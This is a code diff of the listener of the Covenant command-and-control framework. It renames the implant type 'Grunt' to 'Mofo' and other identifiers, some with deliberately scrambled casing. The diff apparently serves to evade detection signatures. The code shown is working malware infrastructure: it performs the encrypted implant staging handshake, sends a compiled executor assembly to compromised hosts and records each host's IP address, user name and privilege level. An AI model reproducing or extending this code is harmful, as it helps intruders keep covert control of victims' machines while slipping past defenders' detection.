-                gruntTasking.CompletionTime = DateTime.UtcNow;
+                mofoTasking.CompletionTime = DateTime.UtcNow;
             }
-            if (gruntTasking.Type == APIModels.GruntTaskingType.Connect)
+            if (mofoTasking.Type == APIModels.MofoTaskingType.Connect)
             {
-                gruntTasking.Status = APIModels.GruntTaskingStatus.Progressed;
+                mofoTasking.Status = APIModels.MofoTaskingStatus.Progressed;
             }
-            await _client.EditGruntTaskingAsync(gruntTasking);
+            await _client.EditMofoTaskingAsync(mofoTasking);
             lock (_hashCodesLock)
             {
-                this.CacheTaskHashCodes.Remove(GetTaskingHashCode(gruntTasking));
+                this.CacheTaskHashCodes.Remove(GetTaskingHashCode(mofoTasking));
             }
-            if (gruntTasking.Type == APIModels.GruntTaskingType.SetDelay || gruntTasking.Type == APIModels.GruntTaskingType.SetJitter ||
-                gruntTasking.Type == APIModels.GruntTaskingType.SetConnectAttempts || gruntTasking.Type == APIModels.GruntTaskingType.SetKillDate ||
-                gruntTasking.Type == APIModels.GruntTaskingType.Exit)
+            if (mofoTasking.Type == APIModels.MofoTaskingType.SetDelay || mofoTasking.Type == APIModels.MofoTaskingType.SetJItter ||
+                mofoTasking.Type == APIModels.MofoTaskingType.SetConneCTAttEmpts || mofoTasking.Type == APIModels.MofoTaskingType.SetKillDate ||
+                mofoTasking.Type == APIModels.MofoTaskingType.Exit)
             {
-                targetGrunt = await _client.GetGruntAsync(targetGrunt.Id ?? default);
+                targetMofo = await _client.GetMofoAsync(targetMofo.Id ?? default);
             }
-            await CheckInGrunt(targetGrunt);
+            await CheckInMofo(targetMofo);
             return;
         }
 
-        private async Task PostStage0(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage0Response, string targetGuid, string guid)
+        private async Task PostStage0(APIModels.Mofo egressMofo, APIModels.Mofo targetMofo, ModelUtilities.MofoEncMsg mofoFirstResponse, string targetGuid, string someid)
         {
-            if (targetGrunt == null || !gruntStage0Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)))
+            if (targetMofo == null || !mofoFirstResponse.VerifyHMAC(Convert.FromBase64String(targetMofo.MofoSharedSecretPassword)))
             {
                 // Always return NotFound, don't give away unnecessary info
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
 
-            bool egressGruntExists = egressGrunt != null;
+            bool egressMofoExists = egressMofo != null;
 
-            if (targetGrunt.Status != APIModels.GruntStatus.Uninitialized)
+            if (targetMofo.Status != APIModels.MofoStatus.Uninitialized)
             {
-                // We create a new Grunt if this one is not uninitialized
-                APIModels.Grunt tempModel = new APIModels.Grunt
+                // We create a new Mofo if this one is not uninitialized
+                APIModels.Mofo tempModel = new APIModels.Mofo
                 {
                     Id = 0,
                     Name = Utilities.CreateShortGuid(),
                     Guid = targetGuid,
                     OriginalServerGuid = Utilities.CreateShortGuid(),
-                    Status = APIModels.GruntStatus.Stage0,
-                    ListenerId = targetGrunt.ListenerId,
-                    Listener = targetGrunt.Listener,
-                    ImplantTemplateId = targetGrunt.ImplantTemplateId,
-                    GruntSharedSecretPassword = targetGrunt.GruntSharedSecretPassword,
-                    SmbPipeName = targetGrunt.SmbPipeName,
-                    Delay = targetGrunt.Delay,
-                    JitterPercent = targetGrunt.JitterPercent,
-                    KillDate = targetGrunt.KillDate,
-                    ConnectAttempts = targetGrunt.ConnectAttempts,
-                    DotNetVersion = targetGrunt.DotNetVersion,
-                    RuntimeIdentifier = targetGrunt.RuntimeIdentifier,
+                    Status = APIModels.MofoStatus.Stage0,
+                    ListenerId = targetMofo.ListenerId,
+                    Listener = targetMofo.Listener,
+                    ImplantTemplateId = targetMofo.ImplantTemplateId,
+                    MofoSharedSecretPassword = targetMofo.MofoSharedSecretPassword,
+                    SmbPipeName = targetMofo.SmbPipeName,
+                    Delay = targetMofo.Delay,
+                    JItterPercent = targetMofo.JItterPercent,
+                    KillDate = targetMofo.KillDate,
+                    ConneCTAttEmpts = targetMofo.ConneCTAttEmpts,
+                    DotNetVersion = targetMofo.DotNetVersion,
+                    RuntimeIdentifier = targetMofo.RuntimeIdentifier,
                     LastCheckIn = DateTime.UtcNow
                 };
-                targetGrunt = await _client.CreateGruntAsync(tempModel);
+                targetMofo = await _client.CreateMofoAsync(tempModel);
             }
             else
             {
-                targetGrunt.Status = APIModels.GruntStatus.Stage0;
-                targetGrunt.Guid = targetGuid;
-                targetGrunt.LastCheckIn = DateTime.UtcNow;
-                targetGrunt = await _client.EditGruntAsync(targetGrunt);
+                targetMofo.Status = APIModels.MofoStatus.Stage0;
+                targetMofo.Guid = targetGuid;
+                targetMofo.LastCheckIn = DateTime.UtcNow;
+                targetMofo = await _client.EditMofoAsync(targetMofo);
             }
-            if (!egressGruntExists)
+            if (!egressMofoExists)
             {
-                egressGrunt = targetGrunt;
+                egressMofo = targetMofo;
             }
 
-            // EncryptedMessage is the RSA Public Key
-            targetGrunt.GruntRSAPublicKey = Convert.ToBase64String(EncryptUtilities.AesDecrypt(
-                gruntStage0Response,
-                Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)
+            // EncMsg is the RSA Public Key
+            targetMofo.MofoRSAPublicKey = Convert.ToBase64String(EncryptUtilities.AesDecrypt(
+                mofoFirstResponse,
+                Convert.FromBase64String(targetMofo.MofoSharedSecretPassword)
             ));
             // Generate negotiated session key
             using (Aes newAesKey = Aes.Create())
             {
                 newAesKey.GenerateKey();
-                targetGrunt.GruntNegotiatedSessionKey = Convert.ToBase64String(newAesKey.Key);
-                await _client.EditGruntAsync(targetGrunt);
+                targetMofo.MofoNegotiatedSessKEy = Convert.ToBase64String(newAesKey.Key);
+                await _client.EditMofoAsync(targetMofo);
             }
 
-            if (egressGruntExists)
+            if (egressMofoExists)
             {
-                // Add this as Child grunt to Grunt that connects it
-                List<APIModels.GruntTasking> taskings = _client.GetAllGruntTaskings().ToList();
-                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ guid of some sort?
-                APIModels.GruntTasking connectTasking = taskings
-                    .Where(GT => GT.Type == APIModels.GruntTaskingType.Connect && (GT.Status == APIModels.GruntTaskingStatus.Progressed || GT.Status == APIModels.GruntTaskingStatus.Tasked))
+                // Add this as Child mofo to Mofo that connects it
+                List<APIModels.MofoTasking> taskings = _client.GetAllMofoTaskings().ToList();
+                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ someid of some sort?
+                APIModels.MofoTasking connectTasking = taskings
+                    .Where(GT => GT.Type == APIModels.MofoTaskingType.Connect && (GT.Status == APIModels.MofoTaskingStatus.Progressed || GT.Status == APIModels.MofoTaskingStatus.Tasked))
                     .Reverse()
                     .FirstOrDefault();
                 if (connectTasking == null)
                 {
-                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                    this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                     return;
                 }
-                ModelUtilities.GruntTaskingMessage tmessage = this.GetGruntTaskingMessage(connectTasking, targetGrunt.DotNetVersion);
-                targetGrunt.Hostname = tmessage.Message.Split(",")[0];
-                await _client.EditGruntAsync(targetGrunt);
-                connectTasking.Status = APIModels.GruntTaskingStatus.Completed;
-                connectTasking.Parameters.Add(targetGrunt.Guid);
-                await _client.EditGruntTaskingAsync(connectTasking);
-                targetGrunt = await _client.GetGruntAsync(targetGrunt.Id ?? default);
+                ModelUtilities.MofoTaskingMessage tmessage = this.GetMofoTaskingMessage(connectTasking, targetMofo.DotNetVersion);
+                targetMofo.Hostname = tmessage.Message.Split(",")[0];
+                await _client.EditMofoAsync(targetMofo);
+                connectTasking.Status = APIModels.MofoTaskingStatus.Completed;
+                connectTasking.Parameters.Add(targetMofo.Guid);
+                await _client.EditMofoTaskingAsync(connectTasking);
+                targetMofo = await _client.GetMofoAsync(targetMofo.Id ?? default);
             }
 
-            byte[] rsaEncryptedBytes = EncryptUtilities.GruntRSAEncrypt(targetGrunt, Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey));
-            ModelUtilities.GruntEncryptedMessage message = null;
+            byte[] rsaEncryptedBytes = EncryptUtilities.MofoRSAEncrypt(targetMofo, Convert.FromBase64String(targetMofo.MofoNegotiatedSessKEy));
+            ModelUtilities.MofoEncMsg message = null;
             try
             {
-                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, rsaEncryptedBytes);
+                message = this.CreateMessageForMofo(egressMofo, targetMofo, rsaEncryptedBytes);
             }
             catch (HttpOperationException)
             {
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
             // Transform response
-            // Stage0Response: "Id,Name,Base64(IV),Base64(AES(RSA(SessionKey))),Base64(HMAC)"
-            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
-            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
+            // FirstResponse: "Id,Name,Base64(IV),Base64(AES(RSA(SessKEy))),Base64(HMAC)"
+            string transformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
+            this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = transformed, Tasking = null });
             return;
         }
 
-        private async Task PostStage1(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage1Response, string guid)
+        private async Task PostStage1(APIModels.Mofo egressMofo, APIModels.Mofo targetMofo, ModelUtilities.MofoEncMsg mofoSeccondResponse, string someid)
         {
-            if (targetGrunt == null || targetGrunt.Status != APIModels.GruntStatus.Stage0 || !gruntStage1Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
+            if (targetMofo == null || targetMofo.Status != APIModels.MofoStatus.Stage0 || !mofoSeccondResponse.VerifyHMAC(Convert.FromBase64String(targetMofo.MofoNegotiatedSessKEy)))
             {
                 // Always return NotFound, don't give away unnecessary info
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            if (egressGrunt == null)
+            if (egressMofo == null)
             {
-                egressGrunt = targetGrunt;
+                egressMofo = targetMofo;
             }
-            byte[] challenge1 = _utilities.GruntSessionDecrypt(targetGrunt, gruntStage1Response);
+            byte[] challenge1 = _utilities.MofoSessionDecrypt(targetMofo, mofoSeccondResponse);
             byte[] challenge2 = new byte[4];
             using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
             {
                 rng.GetBytes(challenge2);
             }
             // Save challenge to compare on response
-            targetGrunt.GruntChallenge = Convert.ToBase64String(challenge2);
-            targetGrunt.Status = APIModels.GruntStatus.Stage1;
-            targetGrunt.LastCheckIn = DateTime.UtcNow;
-            await _client.EditGruntAsync(targetGrunt);
+            targetMofo.MofoChallenge = Convert.ToBase64String(challenge2);
+            targetMofo.Status = APIModels.MofoStatus.Stage1;
+            targetMofo.LastCheckIn = DateTime.UtcNow;
+            await _client.EditMofoAsync(targetMofo);
 
-            ModelUtilities.GruntEncryptedMessage message;
+            ModelUtilities.MofoEncMsg message;
             try
             {
-                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, challenge1.Concat(challenge2).ToArray());
+                message = this.CreateMessageForMofo(egressMofo, targetMofo, challenge1.Concat(challenge2).ToArray());
             }
             catch (HttpOperationException)
             {
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
 
             // Transform response
-            // Stage1Response: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
-            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
-            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
+            // SeccondResponse: "Base64(IV),Base64(AES(challenge1 + challenge2)),Base64(HMAC)"
+            string transformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
+            this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = transformed, Tasking = null });
             return;
         }
 
-        private async Task PostStage2(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage2Response, string guid)
+        private async Task PostStage2(APIModels.Mofo egressMofo, APIModels.Mofo targetMofo, ModelUtilities.MofoEncMsg mofoThirdResponse, string someid)
         {
-            if (targetGrunt == null || targetGrunt.Status != APIModels.GruntStatus.Stage1 || !gruntStage2Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
+            if (targetMofo == null || targetMofo.Status != APIModels.MofoStatus.Stage1 || !mofoThirdResponse.VerifyHMAC(Convert.FromBase64String(targetMofo.MofoNegotiatedSessKEy)))
             {
                 // Always return NotFound, don't give away unnecessary info
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            if (egressGrunt == null)
+            if (egressMofo == null)
             {
-                egressGrunt = targetGrunt;
+                egressMofo = targetMofo;
             }
-            byte[] challenge2test = _utilities.GruntSessionDecrypt(targetGrunt, gruntStage2Response);
-            if (targetGrunt.GruntChallenge != Convert.ToBase64String(challenge2test))
+            byte[] challenge2test = _utilities.MofoSessionDecrypt(targetMofo, mofoThirdResponse);
+            if (targetMofo.MofoChallenge != Convert.ToBase64String(challenge2test))
             {
                 // Always return NotFound, don't give away unnecessary info
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            targetGrunt.Status = APIModels.GruntStatus.Stage2;
-            targetGrunt.LastCheckIn = DateTime.UtcNow;
-            await _client.EditGruntAsync(targetGrunt);
-            byte[] GruntExecutorAssembly = await this._client.CompileGruntExecutorAsync(targetGrunt.Id ?? default);
+            targetMofo.Status = APIModels.MofoStatus.Stage2;
+            targetMofo.LastCheckIn = DateTime.UtcNow;
+            await _client.EditMofoAsync(targetMofo);
+            byte[] MofoExecutorAssembly = await this._client.CompileMofoExecutorAsync(targetMofo.Id ?? default);
 
-            ModelUtilities.GruntEncryptedMessage message;
+            ModelUtilities.MofoEncMsg message;
             try
             {
-                message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, GruntExecutorAssembly);
+                message = this.CreateMessageForMofo(egressMofo, targetMofo, MofoExecutorAssembly);
             }
             catch (HttpOperationException)
             {
-                string emptyTransformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject("")));
+                string emptyTransformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject("")));
                 throw new ControllerNotFoundException(emptyTransformed);
             }
 
             // Transform response
-            // returns: "Base64(IV),Base64(AES(GruntExecutorAssembly)),Base64(HMAC)"
-            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
-            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
+            // returns: "Base64(IV),Base64(AES(MofoExecutorAssembly)),Base64(HMAC)"
+            string transformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
+            this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = transformed, Tasking = null });
             return;
         }
 
-        private async Task RegisterGrunt(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntMessage, string guid)
+        private async Task RegisterMofo(APIModels.Mofo egressMofo, APIModels.Mofo targetMofo, ModelUtilities.MofoEncMsg mofoMessage, string someid)
         {
-            if (targetGrunt == null || targetGrunt.Status != APIModels.GruntStatus.Stage2 || !gruntMessage.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
+            if (targetMofo == null || targetMofo.Status != APIModels.MofoStatus.Stage2 || !mofoMessage.VerifyHMAC(Convert.FromBase64String(targetMofo.MofoNegotiatedSessKEy)))
             {
                 // Always return NotFound, don't give away unnecessary info
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            if (egressGrunt == null)
+            if (egressMofo == null)
             {
-                egressGrunt = targetGrunt;
+                egressMofo = targetMofo;
             }
-            string message = Common.CovenantEncoding.GetString(_utilities.GruntSessionDecrypt(targetGrunt, gruntMessage));
+            string message = Common.LemonSqueezyEncoding.GetString(_utilities.MofoSessionDecrypt(targetMofo, mofoMessage));
             // todo: try/catch on deserialize?
-            APIModels.Grunt grunt = JsonConvert.DeserializeObject<APIModels.Grunt>(message);
-            targetGrunt.IpAddress = grunt.IpAddress;
-            targetGrunt.Hostname = grunt.Hostname;
-            targetGrunt.OperatingSystem = grunt.OperatingSystem;
-            targetGrunt.UserDomainName = grunt.UserDomainName;
-            targetGrunt.UserName = grunt.UserName;
-            targetGrunt.Status = APIModels.GruntStatus.Active;
-            targetGrunt.Integrity = grunt.Integrity;
-            targetGrunt.Process = grunt.Process;
-            targetGrunt.LastCheckIn = DateTime.UtcNow;
+            APIModels.Mofo mofo = JsonConvert.DeserializeObject<APIModels.Mofo>(message);
+            targetMofo.IpAddress = mofo.IpAddress;
+            targetMofo.Hostname = mofo.Hostname;
+            targetMofo.OperatingSystem = mofo.OperatingSystem;
+            targetMofo.UserDomainName = mofo.UserDomainName;
+            targetMofo.UserName = mofo.UserName;
+            targetMofo.Status = APIModels.MofoStatus.Active;
+            targetMofo.Integrity = mofo.Integrity;
+            targetMofo.Process = mofo.Process;
+            targetMofo.LastCheckIn = DateTime.UtcNow;
 
-            await _client.EditGruntAsync(targetGrunt);
+            await _client.EditMofoAsync(targetMofo);
 
-            ModelUtilities.GruntTaskingMessage tasking = new ModelUtilities.GruntTaskingMessage
+            ModelUtilities.MofoTaskingMessage tasking = new ModelUtilities.MofoTaskingMessage
             {
-                Message = targetGrunt.Guid,
+                Message = targetMofo.Guid,
                 Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
-                Type = APIModels.GruntTaskingType.Tasks,
+                Type = APIModels.MofoTaskingType.Tasks,
                 Token = false
             };
 
-            ModelUtilities.GruntEncryptedMessage responseMessage;
+            ModelUtilities.MofoEncMsg responseMessage;
             try
             {
-                responseMessage = this.CreateMessageForGrunt(egressGrunt, targetGrunt, tasking);
+                responseMessage = this.CreateMessageForMofo(egressMofo, targetMofo, tasking);
             }
             catch (HttpOperationException)
             {
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
 
             // Transform response
-            string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
-            this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
+            string transformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(responseMessage)));
+            this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = transformed, Tasking = null });
             return;
         }
 
@@ -822,37 +822,37 @@ namespace Covenant.Models.Listeners
             // Returns IV (16 bytes) + EncryptedData byte array
             public static byte[] AesEncrypt(byte[] data, byte[] key)
             {
-                using (Aes SessionKey = Aes.Create())
+                using (Aes SessKEy = Aes.Create())
                 {
-                    SessionKey.Mode = Common.AesCipherMode;
-                    SessionKey.Padding = Common.AesPaddingMode;
-                    SessionKey.GenerateIV();
-                    SessionKey.Key = key;
+                    SessKEy.Mode = Common.AesCipherMode;
+                    SessKEy.Padding = Common.AesPaddingMode;
+                    SessKEy.GenerateIV();
+                    SessKEy.Key = key;
 
-                    byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
+                    byte[] encrypted = SessKEy.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
 
-                    return SessionKey.IV.Concat(encrypted).ToArray();
+                    return SessKEy.IV.Concat(encrypted).ToArray();
                 }
             }
 
             // Data should be of format: IV (16 bytes) + EncryptedBytes
             public static byte[] AesDecrypt(byte[] data, byte[] key)
             {
-                using (Aes SessionKey = Aes.Create())
+                using (Aes SessKEy = Aes.Create())
                 {
-                    SessionKey.IV = data.Take(Common.AesIVLength).ToArray();
-                    SessionKey.Key = key;
+                    SessKEy.IV = data.Take(Common.AesIVLength).ToArray();
+                    SessKEy.Key = key;
 
                     byte[] encryptedData = data.TakeLast(data.Length - Common.AesIVLength).ToArray();
-                    return SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);
+                    return SessKEy.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                 }
             }
 
-            // Convenience method for decrypting an EncryptedMessagePacket
-            public static byte[] AesDecrypt(ModelUtilities.GruntEncryptedMessage encryptedMessage, byte[] key)
+            // Convenience method for decrypting an EncMsgPacket
+            public static byte[] AesDecrypt(ModelUtilities.MofoEncMsg encryptedMessage, byte[] key)
             {
                 return AesDecrypt(
-                    Convert.FromBase64String(encryptedMessage.IV).Concat(Convert.FromBase64String(encryptedMessage.EncryptedMessage)).ToArray(),
+                    Convert.FromBase64String(encryptedMessage.IV).Concat(Convert.FromBase64String(encryptedMessage.EncMsg)).ToArray(),
                     key
                 );
             }
@@ -885,9 +885,9 @@ namespace Covenant.Models.Listeners
                 }
             }
 
-            public static byte[] GruntRSAEncrypt(APIModels.Grunt grunt, byte[] toEncrypt)
+            public static byte[] MofoRSAEncrypt(APIModels.Mofo mofo, byte[] toEncrypt)
             {
-                return EncryptUtilities.RSAEncrypt(toEncrypt, Common.CovenantEncoding.GetString(Convert.FromBase64String(grunt.GruntRSAPublicKey)));
+                return EncryptUtilities.RSAEncrypt(toEncrypt, Common.LemonSqueezyEncoding.GetString(Convert.FromBase64String(mofo.MofoRSAPublicKey)));
             }
         }
 
@@ -907,13 +907,13 @@ namespace Covenant.Models.Listeners
                 return (byte[])t.GetMethod("Invert").Invoke(null, new object[] { str });
             }
 
-            public partial class GruntTaskingMessage
+            public partial class MofoTaskingMessage
             {
-                public GruntTaskingMessage()
+                public MofoTaskingMessage()
                 {
                     CustomInit();
                 }
-                public GruntTaskingMessage(APIModels.GruntTaskingType? type = default(APIModels.GruntTaskingType?), string name = default(string), string message = default(string), bool? token = default(bool?))
+                public MofoTaskingMessage(APIModels.MofoTaskingType? type = default(APIModels.MofoTaskingType?), string name = default(string), string message = default(string), bool? token = default(bool?))
                 {
                     Type = type;
                     Name = name;
@@ -923,7 +923,7 @@ namespace Covenant.Models.Listeners
                 }
                 partial void CustomInit();
                 [JsonProperty(PropertyName = "type")]
-                public APIModels.GruntTaskingType? Type { get; set; }
+                public APIModels.MofoTaskingType? Type { get; set; }
                 [JsonProperty(PropertyName = "name")]
                 public string Name { get; set; }
                 [JsonProperty(PropertyName = "message")]
@@ -932,13 +932,13 @@ namespace Covenant.Models.Listeners
                 public bool? Token { get; set; }
             }
 
-            public partial class GruntTaskingMessageResponse
+            public partial class MofoTaskingMessageResponse
             {
-                public GruntTaskingMessageResponse()
+                public MofoTaskingMessageResponse()
                 {
                     CustomInit();
                 }
-                public GruntTaskingMessageResponse(APIModels.GruntTaskingStatus? status = default(APIModels.GruntTaskingStatus?), string output = default(string))
+                public MofoTaskingMessageResponse(APIModels.MofoTaskingStatus? status = default(APIModels.MofoTaskingStatus?), string output = default(string))
                 {
                     Status = status;
                     Output = output;
@@ -946,58 +946,58 @@ namespace Covenant.Models.Listeners
                 }
                 partial void CustomInit();
                 [JsonProperty(PropertyName = "status")]
-                public APIModels.GruntTaskingStatus? Status { get; set; }
+                public APIModels.MofoTaskingStatus? Status { get; set; }
                 [JsonProperty(PropertyName = "output")]
                 public string Output { get; set; }
             }
 
-            public enum GruntEncryptedMessageType
+            public enum MofoEncMsgType
             {
                 Routing,
                 Tasking
             }
 
-            public class GruntEncryptedMessage
+            public class MofoEncMsg
             {
-                public string GUID { get; set; }
-                public GruntEncryptedMessageType Type { get; set; }
+                public string SOMEID { get; set; }
+                public MofoEncMsgType Type { get; set; }
                 public string Meta { get; set; } = "";
 
                 public string IV { get; set; }
-                public string EncryptedMessage { get; set; }
+                public string EncMsg { get; set; }
                 public string HMAC { get; set; }
 
-                private static GruntEncryptedMessage Create(string GUID, byte[] message, byte[] key, GruntEncryptedMessageType Type = GruntEncryptedMessageType.Tasking)
+                private static MofoEncMsg Create(string SOMEID, byte[] message, byte[] key, MofoEncMsgType Type = MofoEncMsgType.Tasking)
                 {
                     byte[] encryptedMessagePacket = EncryptUtilities.AesEncrypt(message, key);
                     byte[] encryptionIV = encryptedMessagePacket.Take(Common.AesIVLength).ToArray();
                     byte[] encryptedMessage = encryptedMessagePacket.TakeLast(encryptedMessagePacket.Length - Common.AesIVLength).ToArray();
                     byte[] hmac = EncryptUtilities.ComputeHMAC(encryptedMessage, key);
-                    return new GruntEncryptedMessage
+                    return new MofoEncMsg
                     {
-                        GUID = GUID,
+                        SOMEID = SOMEID,
                         Type = Type,
-                        EncryptedMessage = Convert.ToBase64String(encryptedMessage),
+                        EncMsg = Convert.ToBase64String(encryptedMessage),
                         IV = Convert.ToBase64String(encryptionIV),
                         HMAC = Convert.ToBase64String(hmac)
                     };
                 }
 
-                public static GruntEncryptedMessage Create(APIModels.Grunt grunt, byte[] message, GruntEncryptedMessageType Type = GruntEncryptedMessageType.Tasking)
+                public static MofoEncMsg Create(APIModels.Mofo mofo, byte[] message, MofoEncMsgType Type = MofoEncMsgType.Tasking)
                 {
-                    if (grunt.Status == APIModels.GruntStatus.Uninitialized || grunt.Status == APIModels.GruntStatus.Stage0)
+                    if (mofo.Status == APIModels.MofoStatus.Uninitialized || mofo.Status == APIModels.MofoStatus.Stage0)
                     {
-                        return Create(grunt.Guid, message, Convert.FromBase64String(grunt.GruntSharedSecretPassword), Type);
+                        return Create(mofo.Guid, message, Convert.FromBase64String(mofo.MofoSharedSecretPassword), Type);
                     }
-                    return Create(grunt.Guid, message, Convert.FromBase64String(grunt.GruntNegotiatedSessionKey), Type);
+                    return Create(mofo.Guid, message, Convert.FromBase64String(mofo.MofoNegotiatedSessKEy), Type);
                 }
 
                 public bool VerifyHMAC(byte[] Key)
                 {
-                    if (IV == "" || EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
+                    if (IV == "" || EncMsg == "" || HMAC == "" || Key.Length == 0) { return false; }
                     try
                     {
-                        var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
+                        var hashedBytes = Convert.FromBase64String(this.EncMsg);
                         return EncryptUtilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
                     }
                     catch
@@ -1008,16 +1008,16 @@ namespace Covenant.Models.Listeners
             }
 
             // Data should be of format: IV (16 bytes) + EncryptedBytes
-            public byte[] GruntSessionDecrypt(APIModels.Grunt grunt, byte[] data)
+            public byte[] MofoSessionDecrypt(APIModels.Mofo mofo, byte[] data)
             {
-                return EncryptUtilities.AesDecrypt(data, Convert.FromBase64String(grunt.GruntNegotiatedSessionKey));
+                return EncryptUtilities.AesDecrypt(data, Convert.FromBase64String(mofo.MofoNegotiatedSessKEy));
             }
 
-            // Convenience method for decrypting a GruntEncryptedMessage
-            public byte[] GruntSessionDecrypt(APIModels.Grunt grunt, GruntEncryptedMessage gruntEncryptedMessage)
+            // Convenience method for decrypting a MofoEncMsg
+            public byte[] MofoSessionDecrypt(APIModels.Mofo mofo, MofoEncMsg mofoEncMsg)
             {
-                return this.GruntSessionDecrypt(grunt, Convert.FromBase64String(gruntEncryptedMessage.IV)
-                    .Concat(Convert.FromBase64String(gruntEncryptedMessage.EncryptedMessage)).ToArray());
+                return this.MofoSessionDecrypt(mofo, Convert.FromBase64String(mofoEncMsg.IV)
+                    .Concat(Convert.FromBase64String(mofoEncMsg.EncMsg)).ToArray());
             }
         }
     }
